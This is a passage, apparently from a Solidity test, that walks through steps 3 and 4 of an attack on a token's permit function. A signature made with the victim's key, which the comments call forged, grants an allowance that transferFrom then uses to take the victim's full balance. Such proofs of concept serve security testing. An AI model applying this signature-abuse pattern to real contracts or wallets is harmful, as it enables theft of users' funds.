(uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPrivateKey, digest);

// 3. Attacker calls permit() with the forged signature to gain an allowance.
token.permit(victim, attacker, victimBalance, deadline, v, r, s);

// 4. Attacker steals the approved funds.
token.transferFrom(victim, attacker, victimBalance);
